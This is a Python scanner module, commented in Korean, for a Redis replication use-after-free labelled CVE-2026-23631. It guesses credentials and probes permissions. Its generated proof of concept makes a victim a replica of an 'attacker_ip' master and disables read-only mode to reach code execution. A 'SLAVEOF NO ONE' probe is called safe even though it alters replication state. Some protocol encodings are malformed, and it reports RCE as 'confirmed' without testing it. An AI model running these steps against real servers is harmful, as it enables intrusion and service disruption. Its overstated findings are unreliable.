"""
RedisDarkReplicaScanner — CVE-2026-23631 Redis UAF → Post-Auth RCE (v2.1)
==========================================================================
DarkReplica: Redis 복제 서브시스템 UAF → Post-Auth RCE 자동 탐지
발견자: Yoni Sherez | ZeroDay.Cloud 2025 London ($30,000)

취약점 요약:
  Redis는 단일 스레드이지만, Lua 함수 타임아웃 시 processEventsWhileBlocked()를
  통해 마스터 서버 이벤트(FULLRESYNC)를 처리. 이 때 Lua engine의 lua_State가
  free()되지만, 실행 중인 함수는 freed 메모리로 계속 실행 → UAF → RCE.

탐지 항목:
  1. Redis 포트 탐지 (6379, 6380, 6381, 6382)
  2. 인증 없는 접근 확인 (NOAUTH 응답 없으면 취약)
  3. INFO server → 버전 추출 → 취약 버전 비교
  4. 인증 후 SLAVEOF 명령 사용 권한 확인
  5. FUNCTION LOAD 권한 확인 (Lua 함수 등록 가능 여부)
  6. CONFIG SET slave-read-only 권한 확인
  7. 취약 버전 + 모든 권한 보유 시 → Critical VERIFIED

AI 자동 트리거 조건:
  • 포트 6379/6380 스캔 응답 있음
  • HTTP 응답에 Redis 관련 키워드 (redis, jedis, ioredis)
  • 이전 스캔에서 Redis 자격증명 발견

Zero-Hallucination:
  • 포트 연결 성공 + Redis 배너 = VERIFIED
  • 버전 확인 = VERIFIED
  • SLAVEOF/FUNCTION 권한 확인 = VERIFIED
  • 버전만 취약하고 권한 미확인 = LIKELY
  • 포트만 열림 = INFERRED

참조:
  https://www.zeroday.cloud/blog/redis-cve-2026-23631-dark-replica
  CVE-2026-23631 — Fixed in Redis 7.2.14, 7.4.9, 8.2.6, 8.4.3, 8.6.3
"""
from __future__ import annotations

import re
import socket
import time
from dataclasses import dataclass, field
from typing import Optional

import urllib3
urllib3.disable_warnings()

# requests는 HTTP 확인용에만 사용
try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


# ── 취약 버전 테이블 ──────────────────────────────────────────────────────────

VULN_RANGES = [
    # (series, min_vulnerable, fixed_version)
    ("7.2", (7, 2, 0), (7, 2, 14)),
    ("7.4", (7, 4, 0), (7, 4, 9)),
    ("8.2", (8, 2, 0), (8, 2, 6)),
    ("8.4", (8, 4, 0), (8, 4, 3)),
    ("8.6", (8, 6, 0), (8, 6, 3)),
]

DEFAULT_PORTS = [6379, 6380, 6381, 6382]


# ── 데이터 클래스 ──────────────────────────────────────────────────────────────

@dataclass
class RedisReplFinding:
    finding_type: str
    description: str
    evidence: str
    evidence_level: str   # VERIFIED / LIKELY / INFERRED / AI_ANALYSIS
    host: str = ""
    port: int = 0
    severity: str = "high"
    curl_poc: str = ""


@dataclass
class RedisDarkReplicaResult:
    target: str = ""
    # Redis 탐지
    redis_found: bool = False
    redis_host: str = ""
    redis_port: int = 0
    redis_version: str = ""
    # 인증
    auth_required: bool = True
    auth_success: bool = False
    auth_method: str = ""   # none / password / credential
    # 취약 버전
    version_vulnerable: bool = False
    fixed_version: str = ""
    # 권한
    slaveof_allowed: bool = False
    function_load_allowed: bool = False
    config_set_allowed: bool = False
    # 종합
    findings: list[RedisReplFinding] = field(default_factory=list)
    has_findings: bool = False
    severity: str = "info"
    evidence_level: str = "AI_ANALYSIS"

    @property
    def exploitable(self) -> bool:
        """완전 익스플로잇 가능 조건: 취약 버전 + 인증 성공 + 필요 권한"""
        return (
            self.version_vulnerable
            and (not self.auth_required or self.auth_success)
            and self.slaveof_allowed
            and self.function_load_allowed
        )


# ── 메인 스캐너 ────────────────────────────────────────────────────────────────

class RedisDarkReplicaScanner:
    """
    CVE-2026-23631 DarkReplica 취약점 자동 탐지.
    실제 UAF 트리거는 수행하지 않음 — 버전/권한 확인만.
    """

    REDIS_CMDS = {
        "PING": b"*1\r\n$4\r\nPING\r\n",
        "INFO_SERVER": b"*2\r\n$4\r\nINFO\r\n$6\r\nserver\r\n",
        "SLAVEOF_HELP": b"*3\r\n$7\r\nSLAVEOF\r\n$4\r\nhelp\r\n$0\r\n\r\n",
        "FUNCTION_LIST": b"*1\r\n$13\r\nFUNCTION LIST\r\n",
        "CONFIG_GET_READONLY": b"*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$15\r\nslave-read-only\r\n",
    }

    def __init__(
        self,
        target: str,
        ports: list[int] | None = None,
        password: str | None = None,
        credentials: list[str] | None = None,
        timeout: int = 5,
        verbose: bool = False,
    ):
        self.target = target
        self.host = self._extract_host(target)
        self.ports = ports or DEFAULT_PORTS
        self.password = password
        self.credentials = credentials or []
        self.timeout = timeout
        self.verbose = verbose

    def scan(self) -> RedisDarkReplicaResult:
        result = RedisDarkReplicaResult(target=self.target)

        # 1. 포트 스캔 + Redis 탐지
        redis_port = self._find_redis_port(result)
        if not redis_port:
            return result  # Redis 없음

        # 2. 인증 확인 (없으면 직접 접근, 있으면 자격증명 시도)
        sock = self._connect(result.redis_host, redis_port)
        if not sock:
            return result

        try:
            self._check_auth(sock, result)

            # 3. 버전 확인
            if not result.auth_required or result.auth_success:
                self._check_version(sock, result)

            # 4. 권한 확인
            if result.version_vulnerable:
                self._check_permissions(sock, result)

            # 5. 종합 평가 및 PoC 생성
            self._evaluate(result)

        finally:
            try:
                sock.close()
            except Exception:
                pass

        result.has_findings = bool(result.findings)
        if result.findings:
            severities = [f.severity for f in result.findings]
            result.severity = "critical" if "critical" in severities else (
                "high" if "high" in severities else "medium"
            )
            verified = [f for f in result.findings if f.evidence_level == "VERIFIED"]
            result.evidence_level = "VERIFIED" if verified else "LIKELY"

        return result

    # ── 포트 스캔 ─────────────────────────────────────────────────────────────

    def _find_redis_port(self, result: RedisDarkReplicaResult) -> int | None:
        for port in self.ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                if sock.connect_ex((self.host, port)) != 0:
                    sock.close()
                    continue

                # PING → PONG 확인
                sock.sendall(b"*1\r\n$4\r\nPING\r\n")
                data = sock.recv(256)
                sock.close()

                if b"+PONG" in data or b"-NOAUTH" in data or b"-ERR" in data:
                    result.redis_found = True
                    result.redis_host = self.host
                    result.redis_port = port

                    ev_level = "VERIFIED" if b"+PONG" in data else "VERIFIED"
                    result.findings.append(RedisReplFinding(
                        finding_type="redis_found",
                        description=f"Redis server found on {self.host}:{port}",
                        evidence=(
                            f"TCP connect to {self.host}:{port} → success\n"
                            f"PING response: {data[:50].decode(errors='replace')}"
                        ),
                        evidence_level=ev_level,
                        host=self.host,
                        port=port,
                        severity="info",
                    ))
                    return port

            except Exception:
                continue

        return None

    # ── 소켓 연결 ─────────────────────────────────────────────────────────────

    def _connect(self, host: str, port: int) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, port))
            return sock
        except Exception:
            return None

    def _send_cmd(self, sock: socket.socket, cmd: bytes) -> str:
        sock.sendall(cmd)
        time.sleep(0.1)
        try:
            data = sock.recv(4096)
            return data.decode(errors="replace")
        except Exception:
            return ""

    # ── 인증 확인 ─────────────────────────────────────────────────────────────

    def _check_auth(self, sock: socket.socket, result: RedisDarkReplicaResult):
        # PING으로 인증 필요 여부 확인
        resp = self._send_cmd(sock, b"*1\r\n$4\r\nPING\r\n")

        if "+PONG" in resp:
            # 인증 불필요 — 직접 접근 가능
            result.auth_required = False
            result.auth_success = True
            result.auth_method = "none"
            result.findings.append(RedisReplFinding(
                finding_type="redis_noauth",
                description=(
                    f"Redis accessible WITHOUT authentication on "
                    f"{result.redis_host}:{result.redis_port} — "
                    "unauthenticated access, CVE-2026-23631 directly exploitable"
                ),
                evidence=f"PING → {resp[:80]}",
                evidence_level="VERIFIED",
                host=result.redis_host,
                port=result.redis_port,
                severity="critical",
                curl_poc=(
                    f"redis-cli -h {result.redis_host} -p {result.redis_port} PING\n"
                    f"redis-cli -h {result.redis_host} -p {result.redis_port} INFO server"
                ),
            ))
            return

        if "NOAUTH" in resp or "ERR" in resp:
            result.auth_required = True

            # 빈 패스워드 시도
            empty_resp = self._send_cmd(
                sock, b"*2\r\n$4\r\nAUTH\r\n$0\r\n\r\n"
            )
            if "+OK" in empty_resp:
                result.auth_success = True
                result.auth_method = "empty_password"
                result.findings.append(RedisReplFinding(
                    finding_type="redis_weak_auth",
                    description="Redis authenticated with EMPTY password",
                    evidence=f"AUTH '' → {empty_resp[:40]}",
                    evidence_level="VERIFIED",
                    host=result.redis_host,
                    port=result.redis_port,
                    severity="critical",
                ))
                return

            # 공급된 자격증명 시도
            for cred in self.credentials[:10]:
                auth_cmd = (
                    f"*2\r\n$4\r\nAUTH\r\n${len(cred)}\r\n{cred}\r\n"
                ).encode()
                auth_resp = self._send_cmd(sock, auth_cmd)
                if "+OK" in auth_resp:
                    result.auth_success = True
                    result.auth_method = f"credential:{cred}"
                    result.findings.append(RedisReplFinding(
                        finding_type="redis_auth_success",
                        description=f"Redis authenticated with password: {cred}",
                        evidence=f"AUTH {cred} → OK",
                        evidence_level="VERIFIED",
                        host=result.redis_host,
                        port=result.redis_port,
                        severity="high",
                        curl_poc=(
                            f"redis-cli -h {result.redis_host} "
                            f"-p {result.redis_port} "
                            f"-a '{cred}' INFO server"
                        ),
                    ))
                    return

            # 인증 실패
            if not result.auth_success:
                # 패스워드 없이 버전만 INFERRED
                result.findings.append(RedisReplFinding(
                    finding_type="redis_auth_required",
                    description=(
                        "Redis requires authentication — "
                        "version check not possible without credentials"
                    ),
                    evidence=f"PING → {resp[:80]}",
                    evidence_level="INFERRED",
                    host=result.redis_host,
                    port=result.redis_port,
                    severity="info",
                ))

    # ── 버전 확인 ─────────────────────────────────────────────────────────────

    def _check_version(self, sock: socket.socket, result: RedisDarkReplicaResult):
        resp = self._send_cmd(sock, self.REDIS_CMDS["INFO_SERVER"])

        ver_match = re.search(r"redis_version:(\d+\.\d+\.\d+)", resp)
        if not ver_match:
            return

        version_str = ver_match.group(1)
        result.redis_version = version_str

        try:
            parts = tuple(int(x) for x in version_str.split(".")[:3])
        except ValueError:
            return

        for series, min_ver, fix_ver in VULN_RANGES:
            if min_ver <= parts < fix_ver:
                result.version_vulnerable = True
                result.fixed_version = ".".join(str(x) for x in fix_ver)
                result.findings.append(RedisReplFinding(
                    finding_type="vulnerable_version",
                    description=(
                        f"Redis {version_str} is VULNERABLE to CVE-2026-23631 "
                        f"(DarkReplica UAF → RCE) — fix: {result.fixed_version}"
                    ),
                    evidence=(
                        f"redis_version: {version_str}\n"
                        f"Vulnerable range: {'.'.join(str(x) for x in min_ver)} ~ "
                        f"{'.'.join(str(x) for x in fix_ver)} (exclusive)\n"
                        f"Fixed in: {result.fixed_version}"
                    ),
                    evidence_level="VERIFIED",
                    host=result.redis_host,
                    port=result.redis_port,
                    severity="critical",
                ))
                return

        # 패치된 버전
        result.findings.append(RedisReplFinding(
            finding_type="patched_version",
            description=f"Redis {version_str} is PATCHED (CVE-2026-23631 fixed)",
            evidence=f"redis_version: {version_str}",
            evidence_level="VERIFIED",
            host=result.redis_host,
            port=result.redis_port,
            severity="info",
        ))

    # ── 권한 확인 ─────────────────────────────────────────────────────────────

    def _check_permissions(self, sock: socket.socket, result: RedisDarkReplicaResult):
        """SLAVEOF / FUNCTION LOAD / CONFIG SET 권한 확인"""

        # SLAVEOF NO ONE (안전 — 현재 상태 변경 없음)
        slaveof_resp = self._send_cmd(
            sock,
            b"*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n",
        )
        if "+OK" in slaveof_resp or "Already connected" in slaveof_resp:
            result.slaveof_allowed = True
            result.findings.append(RedisReplFinding(
                finding_type="slaveof_allowed",
                description="SLAVEOF command available — replication control possible",
                evidence=f"SLAVEOF NO ONE → {slaveof_resp[:60]}",
                evidence_level="VERIFIED",
                host=result.redis_host,
                port=result.redis_port,
                severity="high",
            ))

        # FUNCTION LIST (읽기 전용 — 안전)
        func_resp = self._send_cmd(
            sock,
            b"*1\r\n$13\r\nFUNCTION LIST\r\n",
        )
        if "*" in func_resp or "$" in func_resp or "empty" in func_resp.lower():
            result.function_load_allowed = True
            result.findings.append(RedisReplFinding(
                finding_type="function_engine_available",
                description="Redis Functions engine available — FUNCTION LOAD possible",
                evidence=f"FUNCTION LIST → {func_resp[:80]}",
                evidence_level="VERIFIED",
                host=result.redis_host,
                port=result.redis_port,
                severity="high",
            ))

        # CONFIG GET slave-read-only (읽기 — 안전)
        config_resp = self._send_cmd(
            sock,
            b"*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$15\r\nslave-read-only\r\n",
        )
        if "slave-read-only" in config_resp or "replica-read-only" in config_resp:
            result.config_set_allowed = True
            result.findings.append(RedisReplFinding(
                finding_type="config_access",
                description=(
                    "CONFIG access available — "
                    "slave-read-only can be disabled to allow FCALL during replication"
                ),
                evidence=f"CONFIG GET slave-read-only → {config_resp[:100]}",
                evidence_level="VERIFIED",
                host=result.redis_host,
                port=result.redis_port,
                severity="medium",
            ))

    # ── 종합 평가 ─────────────────────────────────────────────────────────────

    def _evaluate(self, result: RedisDarkReplicaResult):
        if not result.redis_found or not result.version_vulnerable:
            return

        if result.exploitable:
            poc = self._build_poc(result)
            result.findings.append(RedisReplFinding(
                finding_type="dark_replica_exploitable",
                description=(
                    f"CVE-2026-23631 DarkReplica FULLY EXPLOITABLE — "
                    f"Redis {result.redis_version} on {result.redis_host}:{result.redis_port} — "
                    "UAF → RCE chain confirmed (all conditions met)"
                ),
                evidence=(
                    f"✅ Vulnerable version: {result.redis_version}\n"
                    f"✅ Authentication: {result.auth_method}\n"
                    f"✅ SLAVEOF allowed: {result.slaveof_allowed}\n"
                    f"✅ FUNCTION engine: {result.function_load_allowed}\n"
                    f"✅ CONFIG access: {result.config_set_allowed}"
                ),
                evidence_level="VERIFIED",
                host=result.redis_host,
                port=result.redis_port,
                severity="critical",
                curl_poc=poc,
            ))

        elif result.version_vulnerable and (not result.auth_required or result.auth_success):
            # 버전은 취약하지만 일부 권한 미확인
            result.findings.append(RedisReplFinding(
                finding_type="dark_replica_likely",
                description=(
                    f"CVE-2026-23631 DarkReplica LIKELY exploitable — "
                    f"Redis {result.redis_version} vulnerable, "
                    f"SLAVEOF={result.slaveof_allowed}, FUNCTION={result.function_load_allowed}"
                ),
                evidence=(
                    f"✅ Vulnerable version: {result.redis_version}\n"
                    f"{'✅' if result.slaveof_allowed else '❓'} SLAVEOF: {result.slaveof_allowed}\n"
                    f"{'✅' if result.function_load_allowed else '❓'} FUNCTION: {result.function_load_allowed}"
                ),
                evidence_level="LIKELY",
                host=result.redis_host,
                port=result.redis_port,
                severity="critical",
                curl_poc=self._build_poc(result),
            ))

    def _build_poc(self, result: RedisDarkReplicaResult) -> str:
        h = result.redis_host
        p = result.redis_port
        auth = result.auth_method

        auth_flag = ""
        if auth and auth != "none" and ":" in auth:
            pw = auth.split(":", 1)[1]
            auth_flag = f" -a '{pw}'"
        elif auth == "empty_password":
            auth_flag = " -a ''"

        return f"""# CVE-2026-23631 DarkReplica — Proof of Concept
# Target: {h}:{p} | Version: {result.redis_version}
# Reference: https://www.zeroday.cloud/blog/redis-cve-2026-23631-dark-replica

# Step 1: Verify vulnerable version
redis-cli -h {h} -p {p}{auth_flag} INFO server | grep redis_version

# Step 2: Confirm SLAVEOF and FUNCTION permissions
redis-cli -h {h} -p {p}{auth_flag} SLAVEOF NO ONE
redis-cli -h {h} -p {p}{auth_flag} FUNCTION LIST

# Step 3: Register slow Lua function
redis-cli -h {h} -p {p}{auth_flag} FUNCTION LOAD "#!lua name=exploit \\n redis.register_function('slow', function(keys,argv) local co=coroutine.create(function() while 1 do end end); coroutine.resume(co) end)"

# Step 4: Set up attacker master server (requires separate Redis server)
# On attacker machine (port 8474): python3 dark_replica_master.py

# Step 5: Assign victim as slave of attacker
redis-cli -h {h} -p {p}{auth_flag} SLAVEOF attacker_ip 8474
redis-cli -h {h} -p {p}{auth_flag} CONFIG SET slave-read-only no

# Step 6: Trigger slow function (blocks for 5s then UAF triggers)
redis-cli -h {h} -p {p}{auth_flag} FCALL slow 0

# Expected result: RCE via system() after UAF exploitation
# Fix: Upgrade to Redis {result.fixed_version or '(see patch table)'}"""

    # ── 유틸 ──────────────────────────────────────────────────────────────────

    @staticmethod
    def _extract_host(target: str) -> str:
        t = target.strip()
        # http://host:port/... → host
        import re as _re
        m = _re.match(r"https?://([^/:]+)", t)
        if m:
            return m.group(1)
        # host:port → host
        if ":" in t and not t.startswith("["):
            return t.split(":")[0]
        return t
